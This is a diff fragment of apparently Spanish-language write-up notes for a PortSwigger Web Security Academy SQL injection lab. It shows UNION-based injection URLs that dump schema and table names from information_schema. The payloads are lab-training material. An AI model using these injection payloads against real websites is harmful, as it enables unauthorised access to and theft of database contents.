@@ -28,9 +28,9 @@ To solve the lab, log in as the `administrator` user.
 ````py
 ## Dumpear la base de Datos:
 .web-security-academy.net/filter?category=-Pets' Union Select '1',schema_name FROM information_schema.schemata -- -
-    #	information_schema
-    #	public
-    #	pg_catalog
+    # information_schema
+    # public
+    # pg_catalog
 
 ## Dumpear el Nombre de las Tablas:
 .web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
